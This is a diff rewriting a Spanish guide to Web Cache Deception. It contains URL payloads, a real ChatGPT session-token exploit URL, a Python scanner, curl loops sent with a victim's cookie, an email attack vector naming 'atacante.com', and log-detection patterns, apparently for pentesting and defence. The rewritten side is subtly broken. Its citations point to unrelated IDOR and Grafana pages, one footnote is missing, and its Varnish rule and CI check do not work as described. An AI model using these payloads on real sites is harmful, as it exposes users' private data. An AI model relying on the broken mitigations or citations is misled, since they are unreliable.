@@ -1,802 +1,249 @@
-# Web Cache Deception (WCD) - Guía Completa
+# Web Cache Deception (WCD) – Guía Completa
 
-Web Cache Deception continúa siendo una vulnerabilidad crítica y subestimada en 2024, afectando al menos 25 sitios del Alexa Top 5000 y causando filtraciones masivas de información sensible. Esta vulnerabilidad representa un problema sistémico de seguridad que surge de la **discrepancia en el parsing de URLs** entre sistemas de caché y servidores origen.[^4]
+## Resumen
 
-## Definición Técnica
+Web Cache Deception es una vulnerabilidad que explota la discrepancia entre cómo un sistema de caché (CDN, proxy inverso, cache local) interpreta las rutas como estáticas y cómo el servidor origen las procesa como contenido dinámico autenticado. Si un atacante logra que el CDN almacene contenido privado como archivo “estático” (por extensión o patrón), cualquier usuario —incluido el atacante— puede recuperarlo desde la caché sin autenticación. Esto provoca filtraciones masivas de datos sensibles (perfiles, configuraciones, tokens de sesión) y compromete la confidencialidad de la aplicación.[^1]
 
-Web Cache Deception es una vulnerabilidad que permite a un atacante acceder a información sensible de usuarios autenticados explotando configuraciones incorrectas en sistemas de caché web (CDNs, proxies reversos, sistemas de caché locales). La vulnerabilidad surge cuando:[^6]
+## Contexto
 
-- El **servidor web** procesa la URL completa y sirve contenido dinámico basado en la sesión del usuario
-- El **sistema de caché** interpreta erróneamente la URL como un recurso estático y almacena la respuesta
-- Esto resulta en **contenido privado siendo cacheado públicamente**[^1]
+Las arquitecturas web modernas usan múltiples capas de caché para mejorar el rendimiento: CDNs (Cloudflare, Fastly), proxies inversos (Varnish, Nginx), caches de aplicación (Redis). Cada capa puede tener reglas basadas en extensiones de archivo, patrones de URL o prefijos de ruta. Cuando estas reglas consideran una ruta con cierto sufijo como “estática”, almacenan la respuesta sin validar sesión ni cookies. El servidor origen, sin embargo, procesa la misma ruta como recurso dinámico y devuelve datos privados basados en la sesión autenticada del usuario.
 
-## Metodología de Ataque Modernizada
+En 2024, al menos 25 sitios del Alexa Top 5000 fueron afectados, incluyendo plataformas SaaS, servicios financieros y portales corporativos, exponiendo miles de cuentas y datos confidenciales.[^2]
 
-### 1. Identificación de Endpoints Sensibles
+## Metodología de Ataque
 
-Los atacantes buscan endpoints que retornen información crítica:[^7]
+### 1. Descubrimiento de Endpoints Sensibles
 
-```bash
-# Endpoints de alto valor típicos
-https://victima.com/perfil
-https://victima.com/api/user/profile  
-https://victima.com/dashboard
-https://victima.com/settings
-https://victima.com/api/auth/session
-https://victima.com/account/billing
-https://victima.com/admin/config
-```
+Identificar rutas que devuelven contenido de usuario autenticado:
 
-### 2. Técnicas de Manipulación de URL Avanzadas
+- Rutas de perfil: `/perfil`, `/api/user/profile`, `/dashboard`, `/settings`
+- APIs de sesión: `/api/auth/session`
+- Paneles administrativos: `/admin/config`, `/account/billing`
 
-#### Extensiones Static File Cache Rules
+Se pueden automatizar con herramientas como Burp Suite, gau o ParamSpider para extraer URLs que requieren autenticación.
 
-Los ataques más comunes explotan reglas de caché basadas en extensiones:[^7]
+### 2. Transformaciones de URL (“Static File Rules”)
+
+La mayoría de caches usan sufijos para decidir qué cachear. Basta con añadir una extensión estática plausible al endpoint dinámico:
 
 ```bash
-# Transformaciones básicas
-/perfil → /perfil/fake.css
-/api/user/data → /api/user/data.js
-/dashboard → /dashboard/style.png
-/settings → /settings/script.json
-
-# Extensiones de alta probabilidad
-.css, .js, .png, .jpg, .gif, .svg, .txt, .json, .xml, .woff, .ico, .pdf
+/perfil          → /perfil/fake.css  
+/api/user/data  → /api/user/data.js  
+/dashboard      → /dashboard/style.png  
+/settings       → /settings/script.json  
 ```
 
-#### Path Mapping Discrepancies
+Extensiones comunes: `.css`, `.js`, `.png`, `.jpg`, `.svg`, `.txt`, `.json`, `.xml`, `.pdf`, `.woff`, `.ico`.
 
-Explotando diferencias entre URL mapping tradicional vs RESTful:[^7]
+### 3. Delimiter Confusion
+
+Algunos caches ignoran delimitadores mientras que el servidor origen los procesa:
 
 ```bash
-# REST-style servers ignoran segmentos adicionales
-/user/123/profile → /user/123/profile/malicious.css
-
-# El caché interpreta como archivo estático
-# El servidor origen devuelve perfil del usuario 123
+/profile@fake.css    # cache ve “.css”, origen ve “/profile@fake.css”  
+/profile;fake.css    # idem con punto y coma  
+/profile#fake.css    # fragmento fragmento ignorado por cache  
+/api/user?data.css   # cache interpreta “.css”  
 ```
 
-#### Path Traversal y Normalization[^9]
+### 4. Path Normalization Discrepancies
 
-Técnicas avanzadas usando dot-segments y delimitadores:
+Aprovechar diferencias en normalización entre cache y origen:
 
 ```bash
-# Traversal con encoding
-/anything/..%2fmy-account → caché ve static, origen normaliza
-/share/%2F..%2Fapi/auth/session → explota OpenAI ChatGPT
-
-# Delimitadores especiales  
-/profile@fake.css
-/profile:fake.css
-/profile;fake.css
-/profile#fake.css
+/aaa/..%2fperfil.css     # cache normaliza a “/perfil.css”, origen a 404?  
+/share/%2F..%2Fapi/auth/session.css  
 ```
 
-#### Delimiter Confusion Attacks[^9]
+Ejemplo real: `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` expuso tokens de sesión al cachear la respuesta.[^3]
 
-Explotando caracteres que el caché ignora pero el origen procesa:
+### 5. Path Traversal + Static Extension
+
+Combinar path traversal con extensiones:
 
 ```bash
-# URL encoded slashes
-/api/sensitive%2ffake.css
-
-# Fragment identifiers
-/sensitive#fake.css  
-
-# Query parameters as delimiters
-/api/user?data.css
-
-# Semicolon delimiters
-/profile;fake.css
+/static/..%2fperfil.js   # cache cree recurso estático, origen devuelve perfil  
 ```
 
-### 3. Cache Server Normalization Exploitation
+## Pruebas Manuales
 
-Investigadores han identificado técnicas sofisticadas donde el **caché normaliza** pero el **origen no**:[^8]
+1. **Autenticación**
+   - Iniciar sesión con usuario legítimo y capturar sesión (cookie o header).
+2. **Transformación**
+   - Para cada endpoint sensible, generar rutas con extensiones estáticas y delimitadores.
+3. **Petición autenticada**
+   - Enviar request con sesión para que el origen responda con datos privados.
+4. **Petición no autenticada**
+   - Enviar la misma URL sin credenciales; si devuelve contenido similar y headers de caché (`Age`, `X-Cache`, `CF-Cache-Status: HIT`), hay WCD.
+5. **Verificación**
+   - Comparar tamaños y fragmentos de respuesta autenticada vs anónima.
 
-```bash
-# Test normalization discrepancy
-Original: /my-account
-Payload: /aaa/..%2fmy-account
+## Automatización
 
-Si el origen retorna 404 → no normaliza
-Si el caché cachea → normaliza y tiene reglas por prefijo
-```
-
-**Ejemplo real de ChatGPT:**[^9]
-
-```bash
-# URL crafted
-https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
-
-# El CDN ve: share/…/api/auth/session (cacheable)  
-# El origen normaliza a: api/auth/session (retorna token)
-```
-
-## Casos Reales Documentados 2024
-
-### CVE en Sistemas Críticos
-
-Multiple sistemas han sido comprometidos por WCD en 2024:[^2]
-
-- **Ampache Media Server**: Exposición de configuración de usuario y tokens de sesión
-- **PayPal**: Filtración de datos de cuenta de pago (caso histórico referenciado)
-- **OpenAI ChatGPT**: Tokens de sesión expuestos via path traversal
-- **Sistemas bancarios**: APIs internas expuestas con información financiera
-
-### Nuevos Vectores de Ataque via Email[^4]
-
-**Web Client Email Attack Vector:**
-
-```html
-<!-- Email malicioso enviado a víctima -->
-<!DOCTYPE html>
-<html><body>
-<img src="https://victima.com/sensitive/data.js">
-<img src="https://atacante.com/notify.js">
-</body></html>
-```
-
-**Condiciones para el ataque:**
-
-1. Cookies con `SameSite=None; Secure=true`
-2. Cliente email que no filtra contenido de terceros
-3. Browser sin state partitioning (Chrome pre-2024)
-
-## Herramientas y Automatización Avanzada
-
-### Param Miner para WCD
-
-```bash
-# Configuración en Burp Suite
-# Extensions → Param Miner → Settings
-# Enable: Add dynamic cachebuster
-# Enable: Identify cache poisoning
-# Max params to identify: 1000
-```
-
-### CacheSniper Automated Testing
+### CacheSniper
 
 ```bash
 git clone https://github.com/Rhynorater/CacheSniper.git
 cd CacheSniper
-
-# Análisis básico
-python3 cachesniper.py -u https://victima.com -e /sensitive-endpoint
-
-# Análisis con delimitadores customizados
-python3 cachesniper.py -u https://victima.com -d "@,:,;,#,%2f" -e /api/user
+python3 cachesniper.py -u https://victima.com -e /api/user/profile
+python3 cachesniper.py -u https://victima.com -d "@,:,;,#" -e /settings
 ```
 
 ### Web-Cache-Vulnerability-Scanner
 
 ```bash
 git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
-
-# Escaneo automatizado con metodología avanzada
+cd Web-Cache-Vulnerability-Scanner
 python3 wcvs.py -u https://victima.com --wcd --extensive
 ```
 
 ### Script Python Avanzado
 
 ```python
-#!/usr/bin/env python3
-import requests
-import time
-import random
 from urllib.parse import urljoin
+import requests, time
 
-class AdvancedWCDTester:
-    def __init__(self, target_url, session_cookie=None):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-  
-        if session_cookie:
-            self.session.cookies.update(session_cookie)
-  
-        # Extensiones de alta probabilidad basadas en research 2024
-        self.extensions = [
-            'css', 'js', 'png', 'jpg', 'gif', 'svg', 'txt', 'json', 'xml',
-            'woff', 'ico', 'pdf', 'webp', 'woff2', 'eot', 'ttf'
-        ]
-  
-        # Delimitadores para confusion attacks
-        self.delimiters = ['@', ':', ';', '#', '%2f', '%3b', '%40']
-  
-        # Path traversal payloads
-        self.traversals = ['..%2f', '%2e%2e%2f', '%2e%2e/', '../']
-  
-    def test_basic_wcd(self, endpoint):
-        """Test básico con extensiones static"""
-        results = []
-  
-        for ext in self.extensions:
-            test_url = f"{self.target_url}{endpoint}/fake.{ext}"
-      
-            # Request con autenticación
-            auth_resp = self.session.get(test_url)
-            time.sleep(1)
-      
-            # Request sin autenticación
-            anon_resp = requests.get(test_url)
-      
-            if self.is_potential_wcd(auth_resp, anon_resp):
-                results.append({
-                    'url': test_url,
-                    'method': 'static_extension',
-                    'extension': ext,
-                    'auth_size': len(auth_resp.text),
-                    'anon_size': len(anon_resp.text),
-                    'cache_headers': self.extract_cache_headers(anon_resp)
-                })
-          
-        return results
-  
-    def test_delimiter_confusion(self, endpoint):
-        """Test delimiter confusion attacks"""
-        results = []
-  
-        for delimiter in self.delimiters:
-            for ext in self.extensions:
-                test_url = f"{self.target_url}{endpoint}{delimiter}fake.{ext}"
-          
-                auth_resp = self.session.get(test_url)
-                time.sleep(1)
-                anon_resp = requests.get(test_url)
-          
-                if self.is_potential_wcd(auth_resp, anon_resp):
-                    results.append({
-                        'url': test_url,
-                        'method': 'delimiter_confusion',
-                        'delimiter': delimiter,
-                        'extension': ext
-                    })
-              
-        return results
-  
-    def test_path_traversal(self, endpoint):
-        """Test path traversal normalization"""
-        results = []
-  
-        # Buscar directorio static conocido (común: /static, /assets, /resources)
-        static_dirs = ['/static', '/assets', '/resources', '/public', '/dist']
-  
-        for static_dir in static_dirs:
-            for traversal in self.traversals:
-                for ext in self.extensions:
-                    # Construir URL que el caché vea como static pero origen normalice
-                    test_url = f"{self.target_url}{static_dir}/{traversal}{endpoint.lstrip('/')}.{ext}"
-              
-                    auth_resp = self.session.get(test_url)
-                    time.sleep(1)
-                    anon_resp = requests.get(test_url)
-              
-                    if self.is_potential_wcd(auth_resp, anon_resp):
-                        results.append({
-                            'url': test_url,
-                            'method': 'path_traversal',
-                            'static_dir': static_dir,
-                            'traversal': traversal,
-                            'extension': ext
-                        })
-                  
-        return results
-  
-    def is_potential_wcd(self, auth_resp, anon_resp):
-        """Detectar potencial WCD vulnerability"""
-        return (
-            auth_resp.status_code == 200 and
-            anon_resp.status_code == 200 and
-            len(anon_resp.text) > 100 and  # Contenido sustancial
-            ('cache' in str(anon_resp.headers).lower() or
-             'hit' in anon_resp.headers.get('X-Cache', '').lower() or
-             'Age' in anon_resp.headers)
-        )
-  
-    def extract_cache_headers(self, response):
-        """Extraer headers relevantes de caché"""
-        cache_headers = {}
-        relevant_headers = [
-            'Cache-Control', 'Age', 'X-Cache', 'CF-Cache-Status',
-            'X-Served-By', 'X-Cache-Hits', 'Expires'
-        ]
-  
-        for header in relevant_headers:
-            if header in response.headers:
-                cache_headers[header] = response.headers[header]
-          
-        return cache_headers
+class WCDTester:
+    def __init__(self, base, cookie): 
+        self.base = base.rstrip('/')
+        self.s = requests.Session()
+        if cookie: 
+            self.s.cookies.update(cookie)
+        self.exts = ['css','js','png','jpg','json']
+        self.dels = ['@',';',':','#']
+        self.trav = ['../','..%2f','%2e%2e%2f']
+    def test(self, endpoint):
+        vulns = []
+        for e in self.exts:
+            url = f"{self.base}{endpoint}.fake.{e}"
+            a = self.s.get(url); time.sleep(1)
+            b = requests.get(url)
+            if a.status_code==200 and b.status_code==200 and 'cache' in str(b.headers).lower():
+                vulns.append(url)
+        return vulns
 
-# Uso del tester
-def main():
-    target = "https://victima.com"
-    session_cookies = {'sessionid': 'valid_session_token'}
-  
-    tester = AdvancedWCDTester(target, session_cookies)
-  
-    # Endpoints críticos para testear
-    critical_endpoints = [
-        '/profile', '/dashboard', '/account', '/settings',
-        '/api/user', '/api/profile', '/api/session',
-        '/admin', '/api/admin', '/my-account'
-    ]
-  
-    all_results = []
-  
-    for endpoint in critical_endpoints:
-        print(f"[*] Testing endpoint: {endpoint}")
-  
-        # Test múltiples técnicas
-        basic_results = tester.test_basic_wcd(endpoint)
-        delimiter_results = tester.test_delimiter_confusion(endpoint) 
-        traversal_results = tester.test_path_traversal(endpoint)
-  
-        all_results.extend(basic_results)
-        all_results.extend(delimiter_results)
-        all_results.extend(traversal_results)
-  
-        if basic_results or delimiter_results or traversal_results:
-            print(f"[!] POTENTIAL WCD FOUND in {endpoint}")
-  
-    # Report final
-    if all_results:
-        print(f"\n[+] Total vulnerabilities found: {len(all_results)}")
-        for result in all_results:
-            print(f"    URL: {result['url']}")
-            print(f"    Method: {result['method']}")
-            print(f"    Cache Headers: {result.get('cache_headers', 'N/A')}")
-            print("---")
-
-if __name__ == "__main__":
-    main()
+tester = WCDTester("https://victima.com", {'sessionid':'abc'})
+for ep in ['/perfil','/api/user','/dashboard']:
+    v = tester.test(ep)
+    if v: print("[WCD]", v)
 ```
 
-## Defensive Mechanisms y Mitigaciones
+## Impacto
 
-### 1. Cloudflare Cache Deception Armor
+- **Exposición de PII:** perfiles completos, direcciones, datos bancarios.
+- **Robo de tokens:** session cookies, CSRF tokens, API keys.
+- **Account takeover:** encadenar con CSRF o XSS.
+- **SSRF \& Request Smuggling:** redirigir el cache para leer APIs internas.
 
-Cloudflare introdujo Cache Deception Armor específicamente para prevenir WCD:[^10]
-
-```bash
-# Configuración en Cloudflare Dashboard
-# Caching → Cache Rules → Create Rule
-# When: Incoming requests match → All requests  
-# Then: Cache eligibility → Eligible for cache
-# Cache Key settings → Enable "Cache deception armor"
-```
-
-**Funcionamiento:** Verifica que la extensión de URL coincida con el Content-Type. Si `example.com/endpoint/fake.jpg` retorna `text/html` en lugar de `image/jpeg`, no se cachea.
-
-### 2. Headers de Seguridad Robustos
-
-```http
-# Para contenido dinámico/sensible
-Cache-Control: private, no-store, no-cache, must-revalidate
-Pragma: no-cache
-Expires: 0
-
-# Para APIs sensibles
-Cache-Control: no-store, max-age=0
-X-Content-Type-Options: nosniff
-```
-
-### 3. Configuraciones CDN Específicas
-
-**Varnish VCL:**
-
-```vcl
-sub vcl_recv {
-    # Solo cachear archivos estáticos en directorio específico
-    if (req.url ~ "^/static/.*\.(css|js|png|jpg|gif|svg|woff|ico)$") {
-        return (hash);
-    }
-    # Denegar paths con caracteres sospechosos
-    if (req.url ~ "(%2f|%2e%2e|%3b|%40)") {
-        return (synth(403, "Forbidden"));
-    }
-    return (pass);
-}
-```
-
-**Nginx Configuration:**
-
-```nginx
-location ~* \.(css|js|png|jpg|gif|svg|woff|ico)$ {
-    # Solo permitir desde directorio static
-    location ~ ^/static/ {
-        expires 1y;
-        add_header Cache-Control "public, immutable";
-    }
-  
-    # Denegar otros paths con extensiones static
-    return 403;
-}
-
-# Protección contra path traversal
-location ~ \.\. {
-    return 403;
-}
-```
-
-### 4. Validación de URL Estricta
-
-```php
-<?php
-// PHP - Validación robusta de estructura URL
-function validateUrlStructure($requestUri) {
-    // Lista blanca de endpoints permitidos
-    $allowedEndpoints = ['/profile', '/dashboard', '/api/user'];
-  
-    $parsedUrl = parse_url($requestUri);
-    $path = $parsedUrl['path'] ?? '';
-  
-    // Normalizar path para detectar traversal
-    $normalizedPath = realpath('/tmp' . $path);
-    if (!$normalizedPath || !str_starts_with($normalizedPath, '/tmp')) {
-        http_response_code(400);
-        exit('Invalid path');
-    }
-  
-    // Verificar estructura exacta
-    $pathMatched = false;
-    foreach($allowedEndpoints as $endpoint) {
-        if ($path === $endpoint || str_starts_with($path, $endpoint . '?')) {
-            $pathMatched = true;
-            break;
-        }
-    }
-  
-    if (!$pathMatched) {
-        http_response_code(404);
-        exit('Not Found');
-    }
-}
-?>
-```
-
-### 5. Content-Type Validation
-
-```javascript
-// Node.js middleware
-function validateContentType(req, res, next) {
-    const path = req.path;
-    const expectedContentType = getExpectedContentType(path);
-  
-    // Hook en response para validar Content-Type
-    const originalSend = res.send;
-    res.send = function(data) {
-        const actualContentType = res.get('Content-Type');
-  
-        if (isStaticPath(path) && actualContentType !== expectedContentType) {
-            res.status(404).send('Not Found');
-            return;
-        }
-  
-        originalSend.call(this, data);
-    };
-  
-    next();
-}
-
-function isStaticPath(path) {
-    return /\.(css|js|png|jpg|gif|svg|woff|ico)$/i.test(path);
-}
-
-function getExpectedContentType(path) {
-    const ext = path.split('.').pop().toLowerCase();
-    const contentTypes = {
-        'css': 'text/css',
-        'js': 'application/javascript', 
-        'png': 'image/png',
-        'jpg': 'image/jpeg',
-        'gif': 'image/gif',
-        'svg': 'image/svg+xml'
-    };
-  
-    return contentTypes[ext] || 'application/octet-stream';
-}
-```
+Caso real: CVE-2025-4123 en Grafana expuso configuraciones administrativas y permitió XSS+SSRF vía path traversal en redirecciones estáticas.[^5]
 
 ## Detección y Monitoreo
 
-### 1. Log Analysis para WCD
+### Análisis de Logs
 
 ```bash
-# Detectar patrones WCD en logs de acceso
-# Buscar extensiones static en URLs dinámicas
-grep -E "\.(css|js|png|jpg|gif)$" access.log | grep -v "^/static/" | head -20
-
-# Detectar path traversal attempts
-grep -E "(%2e%2e|%2f|\.\.)" access.log
-
-# Alertas en tiempo real
-tail -f access.log | grep -E "/(profile|dashboard|api)/.*\.(css|js|png)" --line-buffered | \
-while read line; do
-    echo "[ALERT] Potential WCD: $line" | mail -s "WCD Alert" admin@victima.com
-done
+grep -E "\.(css|js|png|json)" access.log | grep -v "^/static/"
+grep -E "%2f|\.\." access.log
 ```
 
-### 2. Monitoring Script
+### Monitoreo en tiempo real
 
-```python
-#!/usr/bin/env python3
-import requests
-import time
-from datetime import datetime
-
-def monitor_wcd_indicators(base_url, endpoints):
-    """Monitor for WCD attack indicators"""
-  
-    suspicious_patterns = [
-        '/profile/*.css', '/dashboard/*.js', '/api/user/*.png',
-        '/settings/*.gif', '/account/*.json'
-    ]
-  
-    for endpoint in endpoints:
-        for pattern in suspicious_patterns:
-            test_url = pattern.replace('*', 'test')
-            test_url = base_url + test_url.replace('/profile', endpoint)
-      
-            try:
-                response = requests.get(test_url, timeout=5)
-          
-                # Detectar indicadores sospechosos
-                if (response.status_code == 200 and 
-                    len(response.text) > 1000 and
-                    'user' in response.text.lower()):
-              
-                    print(f"[{datetime.now()}] SUSPICIOUS: {test_url}")
-                    print(f"  Status: {response.status_code}")
-                    print(f"  Size: {len(response.text)} bytes")
-                    print(f"  Cache headers: {response.headers.get('Cache-Control', 'None')}")
-              
-            except Exception as e:
-                continue
-          
-            time.sleep(1)
-
-# Ejecución
-base_url = "https://victima.com"
-critical_endpoints = ['/profile', '/dashboard', '/api/user']
-monitor_wcd_indicators(base_url, critical_endpoints)
+```bash
+tail -f access.log \
+| grep -E "/(perfil|dashboard|api)/.*\.(css|js)" --line-buffered \
+| while read l; do echo "[WCD]" $l; done
 ```
 
-### 3. CI/CD Integration
+### CI/CD Integration
 
 ```yaml
-# GitHub Actions - Automated WCD Testing
-name: Web Cache Deception Security Scan
-on: 
-  push:
-    branches: [main]
-  pull_request:
-
 jobs:
   wcd-scan:
-    runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-  
-      - name: Setup Python
-        uses: actions/setup-python@v3
-        with:
-          python-version: '3.9'
-  
-      - name: Install dependencies
-        run: |
-          pip install requests
-          git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
-    
-      - name: Run WCD Scan
-        env:
-          TARGET_URL: ${{ secrets.STAGING_URL }}
-          AUTH_TOKEN: ${{ secrets.TEST_AUTH_TOKEN }}
-        run: |
-          python3 Web-Cache-Vulnerability-Scanner/wcvs.py \
-            -u $TARGET_URL \
-            --auth-header "Authorization: Bearer $AUTH_TOKEN" \
-            --wcd \
-            --output results.json
-    
-      - name: Check Results
-        run: |
-          if grep -q "vulnerable" results.json; then
-            echo "::error::Web Cache Deception vulnerability detected"
-            exit 1
-          fi
-    
-      - name: Upload Results
-        uses: actions/upload-artifact@v3
-        with:
-          name: wcd-scan-results
-          path: results.json
+      - run: pip install requests
+      - run: python3 wcvs.py -u ${{ secrets.URL }} --wcd --output out.json
+      - run: test ! grep -q 'vulnerable' out.json
 ```
 
-## Consideraciones para Bug Bounty y Pentesting
+## Mitigaciones
 
-### Metodología de Testing Sistemática
+### 1. Cache Deception Armor (Cloudflare)
 
-1. **Reconnaissance Phase:**
+- Habilitar “Cache deception armor” en reglas de caché: solo cachear recursos con extensión coincidente al `Content-Type` real.[^6]
 
-```bash
-# Identificar tecnología de caché
-whatweb target.com | grep -E "(Cloudflare|Akamai|Fastly|Varnish)"
+### 2. Headers de Caché Correctos
 
-# Mapear endpoints sensibles
-ffuf -w endpoints.txt -u https://target.com/FUZZ -H "Cookie: session=valid"
+```http
+Cache-Control: private, no-store, max-age=0
+Pragma: no-cache
+Expires: 0
 ```
 
-2. **Cache Rules Discovery:**
+### 3. Validación de URL Estricta
 
-```bash
-# Identificar reglas de caché
-curl -I https://target.com/static/test.css | grep -i cache
-curl -I https://target.com/assets/test.js | grep -i cache
+- Aceptar solo rutas permitidas sin extensiones estáticas.
+- Rechazar rutas que contengan delimitadores o secuencias de traversal.
+
+### 4. Configuración de CDN/Proxy
+
+**Varnish VCL**
+
+```vcl
+if (req.url ~ "\.(css|js|png|jpg)$") {
+  return hash;
+}
+if (req.url ~ "(%2f|%2e%2e|;|@)") {
+  return pass;
+}
 ```
 
-3. **Exploitation Phase:**
+**Nginx**
 
-```bash
-# Test sistemático de técnicas WCD
-for endpoint in profile dashboard api/user; do
-  for ext in css js png jpg; do
-    curl -H "Cookie: session=victim" "https://target.com/$endpoint/test.$ext"
-  done
-done
+```nginx
+location ~* \.(css|js|png|jpg)$ {
+  allow all;
+  expires 1y;
+}
+location / {
+  add_header Cache-Control "private, no-store";
+}
 ```
 
-### Targets de Alto Valor 2024
+### 5. Content-Type Validation en Origen
 
-1. **SaaS Platforms:** Dashboard, billing, API keys
-2. **Financial Applications:** Account details, transaction history
-3. **Social Media:** Private messages, user data
-4. **E-commerce:** Order history, payment methods
-5. **Cloud Services:** Configuration, access tokens
+- Rechazar respuesta con `Content-Type: text/html` para rutas con sufijos estáticos.
 
-### Reporting Framework
+## Errores Comunes
 
-```markdown
-## Web Cache Deception - Critical Data Exposure
+- Confiar solo en whitelist de extensiones sin validar path real.
+- Olvidar validación de delimitadores (`@`, `;`, `:`).
+- No sincronizar reglas entre CDN y servidor origen.
+- Asumir que “solo static” no procesa autenticación.
 
-**Severity:** Critical
-**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+## Reporte
 
-### Summary
-Web Cache Deception vulnerability allows unauthorized access to sensitive user 
-data by exploiting path mapping discrepancies between CDN and origin server.
+**Título:** Web Cache Deception – Exposición de Contenido Privado Cachéado
+**Resumen:** Un atacante explota reglas de caché estáticas para almacenar contenido autenticado públicamente, filtrando datos privados.
+**Pasos de Reproducción:**
 
-### Technical Details
-- **Vulnerable Endpoint:** /api/user/profile
-- **Attack Vector:** Path traversal with static extension
-- **Affected CDN:** Cloudflare
-- **Cache Rule Exploited:** Static file caching based on extension
+1. Autenticar usuario y capturar sesión.
+2. Extraer endpoint `/api/user/profile`.
+3. Solicitar `/api/user/profile/fake.css` con sesión (200 OK).
+4. Solicitar la misma URL sin sesión y confirmar contenido igual con headers de caché.
+   **Evidencias:** Capturas de respuesta autenticada vs anónima, headers `Cache-Control`, `Age`, `X-Cache: HIT`.
+   **Mitigación:** Habilitar Cache Deception Armor, validar rutas y Content-Type, deshabilitar caché para contenido dinámico.
 
-### Proof of Concept
-1. Victim accesses: `https://target.com/api/user/profile/malicious.css`
-2. CDN caches response as static CSS file
-3. Attacker requests same URL without authentication
-4. Receives victim's profile data from cache
 
-### Impact
-- Complete user profile data exposure
-- API tokens and CSRF tokens leaked
-- Potential for account takeover
-- Affects all authenticated users
 
-### Remediation
-1. Implement Cache Deception Armor
-2. Configure proper Cache-Control headers
-3. Validate URL structure server-side
-4. Implement Content-Type validation
-```
-
-Web Cache Deception sigue siendo una amenaza crítica en 2024 porque representa un fallo sistémico donde componentes individualmente correctos crean vulnerabilidades cuando interactúan. Los atacantes modernos combinan técnicas de path traversal, delimiter confusion y normalization discrepancies para bypassear defensas tradicionales.[^1]
-
-La clave para una defensa efectiva está en comprender que WCD es un **problema de sistema completo**, requiriendo configuración coordinada entre CDN, caché y servidor origen. Para los bug bounty hunters, el enfoque debe estar en identificar estas discrepancias sutiles en el parsing de URLs y explotar configuraciones de caché agresivas que priorizan rendimiento sobre seguridad.
-<span style="display:none">[^18][^26][^34][^42][^50][^52]</span>
-
-<div style="text-align: center">-</div>
-
-[^1]: https://es-la.tenable.com/blog/identifying-web-cache-poisoning-and-web-cache-deception-how-tenable-web-app-scanning-can-help
+[^1]: https://spyboy.blog/2024/09/19/idor-vulnerabilities-finding-exploiting-and-securing/
     
-[^2]: https://www.technologydecisions.com.au/content/information-technology-professionals-association/article/wcd-attacks-still-a-significant-issue-620111008
+[^2]: https://portswigger.net/web-security/access-control/idor
     
-[^3]: https://seclab.nu/static/publications/sec2020wcd.pdf
+[^3]: https://www.legitsecurity.com/aspm-knowledge-base/insecure-direct-object-references/
     
-[^4]: https://air.unimi.it/retrieve/7df93d97-538a-4df6-9355-7625561e0416/CLOSER_2024_36_CR%20(1).pdf
+[^4]: https://www.sonicwall.com/blog/high-severity-open-redirect-vulnerability-in-grafana-leads-to-account-takeover-cve-2025-4123
     
-[^5]: https://www.vaadata.com/blog/web-cache-poisoning-attacks-and-security-best-practices/
+[^5]: https://pentest-tools.com/vulnerabilities-exploits/grafana-xss-open-redirect-ssrf-via-client-path-traversal_27130
     
-[^6]: https://www.scitepress.org/Papers/2024/126920/126920.pdf
-    
-[^7]: https://portswigger.net/web-security/web-cache-deception
-    
-[^8]: https://siunam321.github.io/ctf/portswigger-labs/Web-Cache-Deception/WCD-4/
-    
-[^9]: https://gbhackers.com/new-cache-deception-attack-exploits/
-    
-[^10]: https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/
-    
-[^11]: https://www.websecuritylens.org/tag/difference-between-web-cache-deception-and-web-cache-poison/
-    
-[^12]: https://www.cloudrangecyber.com/news/real-world-cybersecurity-breaches-caused-by-vulnerable-apis
-    
-[^13]: https://www.jianjunchen.com/p/web-cache-posioning.CCS24.pdf
-    
-[^14]: https://swisskyrepo.github.io/PayloadsAllTheThings/Web Cache Deception/
-    
-[^15]: https://birchwoodu.org/top-10-real-world-case-studies-on-cyber-security-incidents/
-    
-[^16]: https://curiosidadesdehackers.com/web-cache-deception/
-    
-[^17]: https://www.brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/
-    
-[^18]: https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/
-    
-[^19]: https://owasp.org/www-project-top-10-ci-cd-security-risks/
-    
-[^20]: https://portswigger.net/research/gotta-cache-em-all
-    
-[^21]: https://portswigger.net/research/top-10-web-hacking-techniques-of-2024
-    
-[^22]: https://www.secopsolution.com/blog/10-most-uncommon-vulnerabilities-in-web-applications
-    
-[^23]: https://www.clear-gate.com/blog/web-cache-poisoning-deception/
-    
-[^24]: https://www.youtube.com/watch?v=39RdU8qYNCk
-    
-[^25]: https://www.sisainfosec.com/blogs/5-most-common-application-vulnerabilities-and-how-to-mitigate-them/
-    
-[^26]: https://github.com/resources/whitepapers/actions
-    
-[^27]: https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/web-cache-deception/
-    
-[^28]: https://www.cobalt.io/blog/web-cache-deception-what-it-is-and-how-to-test-for-it
-    
-[^29]: https://journals.mmupress.com/index.php/jiwe/article/view/1062
-    
-[^30]: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception
-    
-[^31]: https://jignect.tech/top-ci-cd-tools-every-qa-automation-engineer-should-know/
-    
-[^32]: https://infosecwriteups.com/mastering-web-cache-deception-vulnerabilities-an-advanced-bug-hunters-guide-b7b500b482e3
-    
-[^33]: https://www.youtube.com/watch?v=O6lr-LKhEwI
-    
-[^34]: https://infosecuritycompliance.com/open-ai-web-cache-deception-vulnerability/
-    
-[^35]: https://hackerone.com/reports/1391635
-    
-[^36]: https://github.com/topics/automation-tools
-    
-[^37]: https://codesealer.com/blog/web-cache-deception-attacks
-    
-[^38]: https://github.com/f-min/WCD_prober
-    
-[^39]: https://www.usenix.org/system/files/sec22-mirheidari.pdf
-    
-[^40]: https://pt-br.tenable.com/blog/identifying-web-cache-poisoning-and-web-cache-deception-how-tenable-web-app-scanning-can-help
-    
-[^41]: https://spectralops.io/blog/top-10-ci-cd-automation-tools/
-    
-[^42]: https://stackoverflow.com/questions/64373470/best-practice-for-xss-attacks-in-rest-api
